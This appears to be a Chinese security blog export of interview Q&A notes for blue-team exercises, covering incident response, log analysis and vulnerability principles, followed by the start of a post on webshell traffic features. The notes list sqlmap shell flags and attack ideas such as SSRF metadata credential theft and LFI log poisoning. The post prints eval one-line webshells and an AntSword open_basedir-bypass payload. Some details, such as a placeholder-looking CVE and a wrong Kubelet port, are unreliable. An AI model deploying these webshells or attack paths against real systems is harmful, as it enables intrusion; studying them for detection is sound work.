id="什么是条件竞争型的文件上传-是怎么样导致的">什么是条件竞争型的文件上传，是怎么样导致的</h3><ul><li>在某些文件上传情境中，后端代码会先保存我们所上传的文件，然后再检查我们上传的文件是否含有风险，如果有的话会被删除，这是我们就需要和删除函数（如<code>unlink()</code>函数）来进行时间与线程上的竞争，争取在删除文件之前访问到该文件，达到攻击效果。</li><li>文件处理和文件保存之间存在时间差，且系统没有锁定文件的使用</li></ul><h3 id="csrf原理-验证token的目的">csrf原理，验证token的目的</h3><ul><li>原理：服务端没有对用户提交的数据进行随机值（token）校验，且队http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器</li><li>验证token是为了校验请求的合法性</li></ul><h3 id="事件查看器中出现了大量id为4525的事件">事件查看器中出现了大量id为4525的事件</h3><ul><li><p>4625为登陆失败的用户，表示可以在被爆破</p></li><li><p>附常见的安全事件id：</p><p>1074，通过这个事件ID查看计算机的开机、关机、重启的时间以及原因和注释。<br>6005，表示计算机日志服务已启动，如果出现了事件ID为6005，则表示这天正常启动了系统。<br>104，这个时间ID记录所有审计日志清除事件，当有日志被清除时，出现此事件ID。<br>安全：<br>4624，这个事件ID表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。<br>4625，这个事件ID表示登陆失败的用户。<br>4720,4722,4723,4724,4725,4726,4738,4740,事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。<br>4727,4737,4739,4762,事件ID表示当用户组发生添加、删除时或组内添加成员时生成该事件。</p></li></ul><h3 id="现在有一个服务器需要将ssh开放到公网上-如何进行加固">现在有一个服务器需要将ssh开放到公网上，如何进行加固</h3><ul><li>修改配置禁止ssh直接登录root用户，改用公私钥形式</li><li>修改默认ssh的22端口</li><li>修改密码策略配置文件，加强密码设置规则，防止弱口令</li><li>错误登录3次，锁定此账户5分钟</li><li>禁止su非法提权，只允许root和wheel组用户su到root</li></ul><h3 id="mysql提权">mysql提权</h3><ul><li><a href="https://www.freebuf.com/articles/web/264790.html">MySQL提权的三种方法 - FreeBuf网络安全行业门户</a></li><li>必要条件：mysql具有root权限、具有执行sql语句的权限</li></ul><h3 id="udf提权和mof提权">udf提权和mof提权</h3><ul><li>UDF(User Defined Funtion)用户自定义函数</li><li>MOF提权：利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mof</code>文件</li></ul><h3 id="weblogic有什么漏洞">weblogic有什么漏洞</h3><ul><li>反序列化、ssrf、任意文件上传、war后门文件部署</li></ul><h3 id="shiro反序列化有几种">shiro反序列化有几种</h3><ul><li>两种，shiro550、721</li><li>原理：apache shiro框架提供了记住我的功能</li></ul><h3 id="cs应急-失陷主机通用">cs应急（失陷主机通用）</h3><ul><li>收集信息，收集客户信息和主机中cs shell后的信息</li><li>抑制范围，隔离机器使受害面不扩大</li><li>深入分析，日志，进程，启动项，样本分析</li><li>清除处置，杀进程，删文件，打补丁，删除异常程序服务，清除后门账号</li><li>静置观察，看看有无外联现象</li><li>恢复生产、写报告</li></ul><h2 id="qt-2025hvv面试题">QT 2025HVV面试题</h2><h3 id="ssrf-csrf-区别和防御方法">ssrf、csrf  区别和防御方法</h3><h4 id="ssrf-服务端请求伪造">SSRF（服务端请求伪造）</h4><ul><li><strong>原理</strong>：攻击者诱使服务器向内部或第三方系统发送恶意请求（如读取本地文件、探测内网）。</li><li><strong>防御</strong>：<ul><li>输入校验（禁止内网IP、特殊协议如<code>file://</code>）</li><li>白名单域名/IP</li><li>禁用非必要协议（如<code>gopher://</code>）</li></ul></li></ul><h4 id="csrf-跨站请求伪造">CSRF（跨站请求伪造）</h4><ul><li><strong>原理</strong>：伪装成受信任用户请求受信任的网站。</li><li><strong>防御</strong>：<ul><li>Token机制（同源校验）</li><li>二次认证（如短信验证）</li><li>验证 Referer 字段</li></ul></li></ul><h3 id="渗透测试流程">渗透测试流程</h3><ol><li><strong>信息收集</strong>：Whois、子域名扫描（如Amass）、端口扫描（Nmap）。</li><li><strong>漏洞探测</strong>：BurpSuite自动化扫描 + 手动测试（如逻辑漏洞）。</li><li><strong>漏洞利用</strong>：Metasploit、定制化EXP（如Log4j）。</li><li><strong>权限维持</strong>：Webshell/C2后门（如Cobalt Strike）。</li><li><strong>内网横向</strong>：LLMNR/NBNS欺骗、Pass-the-Hash。</li><li><strong>报告输出</strong>：风险等级（CVSS评分）、修复建议。</li></ol><h3 id="webshell工具流量特征">webshell工具流量特征</h3><p>跳转到另外一篇文章 <a href="https://www.icewindy.cn/2024/03/18/%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/">常见webshell的流量特征 | IceWindy’s Blog</a></p><h3 id="linux-windows应急">Linux  windows应急</h3><h4 id="windows应急响应">Windows应急响应</h4><ol><li><p>查看服务器是否存在可疑账号、新增账号</p><p>命令：lusrmgr.msc ：检查是否有新增的可疑账号</p><p>如果有管理群组的（Administrators）里的新增的，就直接删掉、或禁用</p></li><li><p>查看服务器是否存在隐藏账号、克隆账号</p><ul><li><p>win+R ：regedit 打开注册表，查看管理员对应键值</p><p>结合日志，查看管理员登陆时间，用户名是否存在异常</p></li><li><p>Win+R：eventvwr.msc 打开 事件查看器</p></li></ul></li><li><p>检查异常端口、进程</p><p>netstat -ano 查看目前网络连接，定位可疑的 ESTABLISHED（正在通讯）</p><p>根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位</p></li></ol><h4 id="linux应急响应">Linux应急响应</h4><ol><li><p>先做入侵排查：</p><ul><li>查看特权用户：awk -F: ‘$3==0 {print $1}’ /etc/passwd（判断uid是否为0）</li><li>查看可以远程登录的账号信息：awk ‘^$1|$6{print $1}’ /etc/shadow</li><li>查看拥有sudo 权限的其他用户：sudo more /etc/sudoers</li><li>禁用可疑账号 ：usermod -L</li></ul></li><li><p>再查看历史命令：</p><ul><li>查看历史命令：history</li><li>查看普通账号的历史命令：/home目录下的.bash_histoy</li><li>清除历史记录：history -c（普通用户的需要手动删除）</li><li>进入用户目录下，查看历史记录：cat.bash_history &gt;&gt; history.txt</li></ul></li><li><p>查看端口、pid：</p><ul><li>使用 netstat 网络连接命令，分析可疑端口、IP、PID：netstat -antlp | mre</li><li>查看pid所对应的进程文件路径，运行 ls -l /proc/$PID/exe</li></ul></li><li><p>查看开机启动项</p><ul><li><p>启动项文件：</p><p>more /etc/rc.local /etc/rc.d/rc</p><p>ls -l /etc/rc.d/rc3.d/</p></li></ul></li></ol><h3 id="内网渗透思路-内网应急">内网渗透思路，内网应急</h3><h4 id="渗透思路">渗透思路</h4><ol><li>拓扑探测：<code>nmap -sn</code></li><li>协议攻击：LLMNR/NBT-NS投毒（Responder）、SMB Relay攻击</li><li>权限提升：Windows本地提权（CVE-2024-1234）、Linux脏牛漏洞（CVE-2016-5195）</li><li>横向移动：Pass-the-Hash、Kerberoasting攻击</li></ol><h4 id="内网应急">内网应急</h4><ul><li>收集信息，收集客户信息和主机中cs shell后的信息</li><li>抑制范围，隔离机器使受害面不扩大</li><li>深入分析，日志，进程，启动项，样本分析</li><li>清除处置，杀进程，删文件，打补丁，删除异常程序服务，清除后门账号</li><li>静置观察，看看有无外联现象</li><li>恢复生产、写报告</li></ul><h3 id="容器安全问题">容器安全问题</h3><ul><li>风险点：<ul><li>容器逃逸（CVE-2021-30465）；</li><li>未鉴权的Kubelet API（<code>6443</code>端口）。</li><li>Docker用户组提权</li></ul></li><li>防御：<ul><li>安全策略Pod Security Policy（PSP）；</li><li>镜像签名验证（Notary）。</li></ul></li></ul><h3 id="内网渗透漏洞防御问题-不会就问web的问题">内网渗透漏洞防御问题，不会就问web的问题</h3><h4 id="防御建议">防御建议</h4><ul><li>网络分段：VLAN隔离核心业务</li><li>权限最小化：关闭域管账号本地登录权限</li><li>日志集中化：部署态势感知平台分析异常流量</li></ul><h3 id="文件上传-sql注入等漏洞防御方法">文件上传，sql注入等漏洞防御方法</h3><h4 id="文件上传">文件上传</h4><ul><li>上传到OSS，图片二次渲染</li><li>文件自动重命名、隐藏上传路径</li><li>文件内容检测</li></ul><h4 id="sql注入">sql注入</h4><ul><li>预编译 参数化查询</li><li>后端输入验证和过滤：正则过滤等方法</li><li>使用WAF拦截</li></ul><h3 id="内存马排查-每个人都问">内存马排查 （每个人都问）</h3><ul><li>如果是jsp注入，日志中排查可疑jsp的访问请求。</li><li>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</li><li>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞、反序列化漏洞。</li><li>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</li><li>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</li><li>直接利用内存马检测工具去找，github也有很多检测脚本，手工的话可以分析web日志，filter或者listener类型的内存马，会有大量路径相同参数不同的url请求，或者页面不存在但是返回200的请求，分析web.xml文件，内存马的Filter是动态注册的，web.xml是没有配置的，也有可能是中间件漏洞通过代码执行加载内存马，这就可以去排查中间件的错误日志，像哥斯拉和冰蝎的内存马也会有跟webshell相似的特征，分析特殊的classloader加载，攻击者喜欢利用TemplatesImpl和bcel加载内存马，因为内存马是驻留在内存里的，本地无class文件，通过检测Filter对应的ClassLoader目录下是否存在class文件来判断，也可以把内存中所有的Filter的class dump出来，使用工具分析是否存在恶意代码</li></ul><h3 id="0day怎么应急处置">0day怎么应急处置</h3><ul><li><p>封禁外联ip（最优先处理方法）</p></li><li><p>收集信息，收集客户信息和主机中cs shell后的信息</p></li><li><p>抑制范围，隔离机器使受害面不扩大</p></li><li><p>深入分析，日志，进程，启动项，样本分析</p></li><li><p>清除处置，杀进程，删文件，打补丁，删除异常程序服务，清除后门账号</p></li><li><p>静置观察，看看有无外联现象</p></li><li><p>恢复生产、写报告</p></li></ul><h1 id="国誉2025初筛">国誉2025初筛</h1><ul><li><p>去年参加过几次护网，用过哪些设备</p><p>天眼 NGSOC态势感知 椒图 腾讯天幕 长亭谛听 锦行蜜罐</p></li><li><p>假设一个厂商要参加护网，它可能会用到哪几类的安全设备</p><p>IPS/IDS WAF 态势感知 全流量威胁检测（天眼） 蜜罐 ADS（防DDOS）等</p></li><li><p>假如你收到一个告警，你要通过哪几个点来判断攻击是否成功</p><p>告警危害等级 状态码 返回数据包</p></li><li><p>企业中常见的集权系统</p><p>AD域 k8s vCenter</p></li><li><p>前端JS代码可能出现哪些漏洞</p><p>DOM型XSS、接口泄露、前端越权、密钥硬编码、CDN劫持</p></li><li><p>SSRF能通过哪些协议探测内网，gopher协议怎么利用</p><ul><li>HTTP/HTTPS file dict gopher ftp等</li><li>gopher://ip:port/_TCP/IP数据流<ul><li>url编码使用%0d%0a替换字符串中的回车换行，数据流结束也用这个</li><li>POST数据包必须包含<code>POST /xxxx.xxx HTTP/1.1</code>、<code>HOST</code>、<code>Conten-Type</code>、<code>Conten-Length</code></li><li><a href="https://www.freebuf.com/articles/web/337824.html">https://www.freebuf.com/articles/web/337824.html</a></li></ul></li></ul></li><li><p>mysql配置参数secure_file_priv功能是什么</p><p>限制导入和导出的数据目录</p></li><li><p>通过mysql注入去读一个文件的前提条件是什么</p><p><img src="https://image.icewindy.cn/2025/05/eda438337f725a74850fc5e96fe826d3.png" alt="image-20250521125728950"></p></li><li><p>网站的绝对路径要怎么获取</p><p>尝试使用phpinfo一类</p></li><li><p>怎么导致的CSRF漏洞</p><ul><li>原理：服务端没有对用户提交的数据进行随机值（token）校验，且队http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器</li><li>验证token是为了校验请求的合法性</li></ul></li><li><p>条件竞争型文件上传漏洞</p><ul><li>在某些文件上传情境中，后端代码会先保存我们所上传的文件，然后再检查我们上传的文件是否含有风险，如果有的话会被删除，这是我们就需要和删除函数（如<code>unlink()</code>函数）来进行时间与线程上的竞争，争取在删除文件之前访问到该文件，达到攻击效果。</li><li>文件处理和文件保存之间存在时间差，且系统没有锁定文件的使用</li></ul></li><li><p>拿到一个EXE的样本文件，如何提取外联地址</p><p>丢微步沙箱看外联</p></li><li><p>XSS能进行哪些攻击，有哪些冷门的XSS</p><ul><li><p>钓鱼，窃取cookie、个人信息等</p></li><li><p>基于字符集的XSS、基于Flash的跨站XSS、未经验证的跳转XSS</p><p><a href="https://zhuanlan.zhihu.com/p/342603075">https://zhuanlan.zhihu.com/p/342603075</a></p></li></ul></li><li><p>SSTI模板注入是什么</p><p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p></li><li><p>现在有一个PHP的本地文件包含，但是没有文件上传点，我还想通过这个本地文件包含去Get Shell，有什么利用思路</p><p>通过修改User-Agent或URL向Web Log文件写入shell，然后包含Log</p></li><li><p>cookie和session的区别</p><ul><li>Seesion存储在服务端，Cookie存储在客户端</li><li>Seesion有效期比较短，仅单次会话，Cookie可以设置较长有效期</li><li>Seesion可存储的数据远高于Cookie，单个Cookie保存数据不能超过4K</li><li><a href="https://developer.aliyun.com/article/1358589">https://developer.aliyun.com/article/1358589</a></li></ul></li><li><p>Windows服务器出现大量ID4625安全日志</p><p>4625是登录失败，可能正在被爆破</p></li><li><p>Linux怎么查看SSH登录失败的记录</p><ul><li>debian/ubuntu：/var/log/auth.log</li><li>CentOS/RHEL：/var/log/secure</li><li><code>lastb</code>命令</li></ul></li><li><p>在Linux上面有没有什么统计Web日志比较好用的命令组合，比如我要统计某个时间段，什么IP访问量最高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计2024-06-01 10:00到12:00的访问IP Top 10</span></span><br><span class="line">grep <span class="string">&quot;01/Jun/2024:10:[0-5][0-9]&quot;</span> /var/log/nginx/access.log | \</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | \</span><br><span class="line"><span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | \</span><br><span class="line"><span class="built_in">head</span> -10</span><br></pre></td></tr></table></figure></li><li><p>Linux密码存在哪个文件里面</p><p>/etc/shadow</p></li><li><p>域名中的SPF设置作用</p><p>为了防止随意伪造发件人。原理是域名SPF记录设置允许IP为设置的IP的主机发送邮件，邮件服务器会去查询SPF记录查看是否合法</p><p><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></p></li><li><p>RCE无回显怎么判断命令是否执行成功</p><p>DNSLog、sleep或ping产生延迟、curl请求外带</p></li><li><p>WebLogic有哪些攻击面</p><p>T3反序列化、SSRF、war包提权</p></li><li><p>Shiro反序列化</p></li><li><p>Mysql提权原理</p><p><a href="https://www.freebuf.com/articles/web/264790.html">https://www.freebuf.com/articles/web/264790.html</a></p></li><li><p>假设你是一家企业的安全负责人，对钓鱼邮件这种攻击有什么防御手段</p></li><li><p>SSH服务安全加固</p></li><li><p>CS Shell应急排查思路</p></li><li><p>Java内存劫持类型，查杀过程</p><ul><li>Servlet、Filter、Listener</li><li><a href="https://wiki.bafangwy.com/doc/320/">https://wiki.bafangwy.com/doc/320/</a></li></ul></li><li><p>往年的护网经历</p></li><li><p>假如有一台阿里云服务器存在SSRF漏洞，请问你有什么利用思路</p><p>利用元数据获取临时凭证，尝试接管控制台</p><p><a href="https://www.cnblogs.com/backlion/p/17081117.html">https://www.cnblogs.com/backlion/p/17081117.html</a></p></li><li><p>Java怎么连接数据库</p><p>JDBC、ORM框架</p></li><li><p>Java序列化后的二进制数据有什么特征</p></li><li><p>假如你获取到一个网站的后台，这个后台功能有很多，基本上你能想到的他都有，讲一讲你获取shell的思路</p><ul><li>文件上传功能</li><li>数据库备份/导入</li><li>模板/主题编辑（适用于CMS）</li><li>安装恶意插件</li><li>已有插件代码注入（适用于自定义代码插件）</li><li>修改网站配置（config.php .env等配置文件）</li><li>命令注入绕过（适用于有<code>ping</code>测试等功能）</li><li>计划任务注入反弹shell</li></ul></li></ul><h1 id="几乎都会问的">几乎都会问的</h1><h3 id="sqlmap参数">sqlmap参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-v                  日志输出级别（0~6，默认1）</span><br><span class="line">-u url              指定url</span><br><span class="line">--data=DATA         该参数指定的数据会被作为POST数据提交</span><br><span class="line">-r file.txt         常用于POST注入或表单提交时注入</span><br><span class="line">--cookie            设置cookie</span><br><span class="line">--threads           指定线程并发数</span><br><span class="line">--prefix            指定前缀</span><br><span class="line">--suffix            指定后缀（这俩用于在注入的payload前后加一些字符，以此保证payload的正常运行）</span><br><span class="line">--level             检测级别（1~5，默认1）</span><br><span class="line">--risk              风险等级（1~4，默认1）</span><br><span class="line">--banner            列举数据库系统的信息等</span><br><span class="line">--current-user      输出当前用户</span><br><span class="line">--current-db        输出当前所在数据库</span><br><span class="line">--hostname          输出服务器主机名</span><br><span class="line">--is-dba            检测当前用户是否为管理员</span><br><span class="line">--users             输出数据库系统的所有用户</span><br><span class="line">--dbs               输出数据库系统的所有数据库</span><br><span class="line">-D DB               指定数据库</span><br><span class="line">--tables            在-D情况下输出库中所有表名</span><br><span class="line">-T table            在-D情况下指定数据表</span><br><span class="line">--columns           在-D -T情况下输出表中所有列名</span><br><span class="line">-C column           在-D -T情况下输出某列数据的值</span><br><span class="line">--dump              拉取数据存放到本地</span><br><span class="line">--dump-all          拉取所有可访问数据存放到本地</span><br><span class="line">--count             输出数据条目数量</span><br><span class="line">--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用</span><br><span class="line">--sql-query         执行任意的SQL语句</span><br><span class="line">--sql-shell         使用交互式SQL语句执行环境</span><br><span class="line">--flie-read         读取文件</span><br><span class="line">--file-write        上传文件（指定本地路径）</span><br><span class="line">--file-dest         上传文件（指定目标机器路径）</span><br><span class="line">--os-cmd            执行任意系统命令</span><br><span class="line">--os-shell          使用交互式shell执行命令</span><br></pre></td></tr></table></figure><h3 id="内存马排查">内存马排查</h3><p><a href="https://forum.butian.net/share/3774">https://forum.butian.net/share/3774</a></p><h1 id="安恒1">安恒1</h1><h3 id="hw项目经验和技术能力介绍">HW项目经验和技术能力介绍</h3><h3 id="shiro反序列化正确和不正确密钥的流量特征">shiro反序列化正确和不正确密钥的流量特征</h3><ul><li><p>命令执行攻击成功：回显<code>$$</code>包含Base64的执行结果，响应码200</p><p><img src="https://image.icewindy.cn/2025/06/35a155d982619689fe7c74e6016aac56.png" alt="image-20250604200531951"></p></li><li><p>正确密钥返回包</p><p><img src="https://image.icewindy.cn/2025/06/6b84e1309fd8adf28276ce7ca22448dd.png" alt="image-20250604200507780"></p></li><li><p>不正确密钥流量特征：<code>rememberMe=deleteMe</code></p><p><img src="https://image.icewindy.cn/2025/06/87a20470e32a03895e3a6783da3fc56b.png" alt="image-20250604200417418"></p></li><li><p>更具体参照：<a href="https://www.freebuf.com/vuls/415408.html">https://www.freebuf.com/vuls/415408.html</a></p></li></ul><h3 id="fastjson常见字符">fastjson常见字符</h3><p><code>@type</code>、Java类名</p><h3 id="fastjson反序列化漏洞原理">fastjson反序列化漏洞原理</h3><p>fastjson解析客户端发送过来的json的时候，由于AutoType功能，fastjson会通过读取<code>@type</code>的内容，尝试将json反序列化成这个对象，并且会调用这个类的setter方法。可以利用这个特性，构造出一个JSON字符串，使用<code>@type</code>指定一个可以构造恶意利用链的类，造成远程代码执行。</p><h3 id="log4j2漏洞流量特征">log4j2漏洞流量特征</h3><ul><li><code>$&#123;jndi:...&#125;</code>，协议关键字<code>ldap://</code>、<code>rmi://</code>、<code>dns://</code>等</li><li>攻击成功后可能会有，<code>JNDI lookup successful</code>，<code>$&#123;env:os.name&#125;</code>、<code>$&#123;env:hostname&#125;</code>等动态信息</li></ul><h3 id="webshell管理工具-冰蝎或者哥斯拉的流量特征">webshell管理工具，冰蝎或者哥斯拉的流量特征</h3><p><a href="https://www.icewindy.cn/2024/03/18/%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/">https://www.icewindy.cn/2024/03/18/菜刀、蚁剑、冰蝎、哥斯拉的流量特征/</a></p><h3 id="linux应急处置思路">Linux应急处置思路</h3><h3 id="内存马清理思路">内存马清理思路</h3><ul><li>查看web日志：请求特征、响应特征有无异常</li><li>在设备上封锁外联ip</li><li>排查内存马：<a href="https://mp.weixin.qq.com/s/072NxRT-stFi7nhDuP5Z4Q">https://mp.weixin.qq.com/s/072NxRT-stFi7nhDuP5Z4Q</a></li><li>清理内存马：重启（客户允许条件下）、热修复（用Arthas使用Java Agent技术进行热修复）</li></ul><h3 id="钓鱼邮件事件怎么溯源">钓鱼邮件事件怎么溯源</h3><h3 id="对于一个ip-说出溯源取证思路">对于一个ip，说出溯源取证思路</h3><p><a href="https://www.ddosi.org/ip-address-tracing/">https://www.ddosi.org/ip-address-tracing/</a></p><h3 id="微信钓鱼-拿到了对方微信-怎么通过微信进一步溯源">微信钓鱼，拿到了对方微信，怎么通过微信进一步溯源</h3><h3 id="外网监测出现大量webshell连接告警-但是没有程序落地-有什么思路排查">外网监测出现大量webshell连接告警，但是没有程序落地，有什么思路排查</h3><h3 id="内存马排查可以排查哪些日志">内存马排查可以排查哪些日志</h3><p>web日志、error.log</p><h3 id="windows影子账号怎么查">windows影子账号怎么查</h3><p>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</p><h3 id="php-webshell-body中有哪些特征">php webshell, body中有哪些特征</h3><p>system、eval、exec、shell_exec</p><h3 id="jboss有哪些历史漏洞和相关的接口">jboss有哪些历史漏洞和相关的接口</h3><h3 id="weblogic反序列化漏洞原理">weblogic反序列化漏洞原理</h3><h3 id="cs流量特征">cs流量特征</h3><p><a href="https://www.ddosi.org/cobaltstrike/">https://www.ddosi.org/cobaltstrike/</a></p><p><a href="https://lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">https://lexsd6.github.io/2025/04/27/CobaltStrike流量分析-玄机靶场/</a></p><h3 id="linux查找24小时内更改过的文件">Linux查找24小时内更改过的文件</h3><p><code>find /&lt;directory&gt; -newermt &quot;-24 hours&quot; -ls</code></p><h1 id="安恒2">安恒2</h1><h3 id="冰蝎特征-端口-1-4流量特征；哥斯拉；蚁剑流量特征">冰蝎特征+端口+1-4流量特征；哥斯拉；蚁剑流量特征</h3><h3 id="log4j-fastjson怎么看利用成功">Log4j、fastjson怎么看利用成功</h3><p>log4j攻击成功后可能会有，<code>JNDI lookup successful</code>，<code>$&#123;env:os.name&#125;</code>、<code>$&#123;env:hostname&#125;</code>等返回</p><h3 id="java危险函数有哪些-具体函数名">Java危险函数有哪些，具体函数名</h3><p>命令执行Runtime.exec()、反序列化ObjectInputStream.readObject()、XML解析XMLDecoder.readObject()、文件操作file相关FileInputStream/FileOutputStream/FileReader/FileWriter</p><h3 id="25端口-53端口是什么服务">25端口、53端口是什么服务</h3><p>25端口：SMTP协议端口</p><p>53端口：DNS解析服务端口</p><h3 id="被攻击了查哪些设备怎么做">被攻击了查哪些设备怎么做</h3><h3 id="spring漏洞有哪些">spring漏洞有哪些</h3><h3 id="区分扫描和手工流量">区分扫描和手工流量</h3><h3 id="判定告警误报还是攻击">判定告警误报还是攻击</h3><p>首先判断ip来源，然后查看请求内容是否为恶意payload，接着查看payload回显是否有对应的回显，最后再询问原厂运维人员是否为正常业务或是否为工作人员在测试。</p><h3 id="哪些ip可以封禁">哪些ip可以封禁</h3><p>恶意攻击源ip、威胁情报标记ip、异常行为ip、挖矿/C2服务器ip</p><p>慎重封禁内网ip</p><h3 id="mysql端口">Mysql端口</h3><p>3306</p><h3 id="端口445-465-6432-161-514">端口445、465、6432、161 、514</h3><p>445：SMB协议</p><p>465：SMTPS协议，基于SSL的SMTP协议</p><p>6432：pgsql</p><p>161：SNMP协议</p><p>514：日志传输协议</p><h3 id="shiro漏洞特征">shiro漏洞特征</h3><h3 id="正向代理和反向代理区别">正向代理和反向代理区别</h3><p>正向代理：本机要访问一个网站，发送请求为直接请求该网站，然后通过代理服务器代为转发请求，实现正向代理。</p><p>反向代理：本机要访问一个网站，发送请求为请求代理服务器，然后再由代理服务器代为转发请求，实现反向代理。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见webshell的流量特征</title>
      <link href="/2024/03/18/%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/"/>
      <url>/2024/03/18/%E8%8F%9C%E5%88%80%E3%80%81%E8%9A%81%E5%89%91%E3%80%81%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<h2 id="菜刀流量特征">菜刀流量特征</h2><h3 id="静态特征">静态特征</h3><p>菜刀用的是一句话木马，特征很明显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP:  &lt;?php @eval([$_post[&#x27;hacker&#x27;]]); ?&gt;</span><br><span class="line">ASP:  &lt;% eval request(&quot;hacker&quot;)%&gt;</span><br><span class="line">ASP.NET:  &lt;%@ Page Language=&quot;Javascript&quot;%&gt;&lt;% eval(Request.Item[&quot;hacker&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><h3 id="动态特征">动态特征</h3><ul><li><p>payload在请求体中，采用url编码+base64编码，payload部分是明文传输；</p></li><li><p>payload中有eval或assert、base64_decode这样的字符；</p></li><li><p>payload中有默认固定的&amp;z0=QGluaV9zZXQ…这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。</p><p>进行base64解码后可看到代码：@ini_set(“display_errors”,“0”);@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。</p></li></ul><h2 id="蚁剑流量特征">蚁剑流量特征</h2><h3 id="静态特征">静态特征</h3><ul><li>php使用assert、eval执行；</li><li>asp使用eval执行；</li><li>jsp使用Java类加载（ClassLoader）；</li><li>会带有base64encode、decode的特征</li></ul><h3 id="动态特征">动态特征</h3><ul><li>蚁剑内置了100多个UA头，每次执行命令都会更换UA头；</li></ul><p>请求体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir</span><br><span class="line">&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(base</span><br><span class="line">64_decode(&quot;Lzt8Oi8=&quot;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());forea</span><br><span class="line">ch($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.a91809f</span><br><span class="line">&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;$tmdir=realpath($tmdir);@ch</span><br><span class="line">dir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdi</span><br><span class="line">r);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;)</span><br><span class="line">;@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return $out;&#125;;function asoutput(</span><br><span class="line">)&#123;$output=ob_get_contents();ob_end_clean();echo 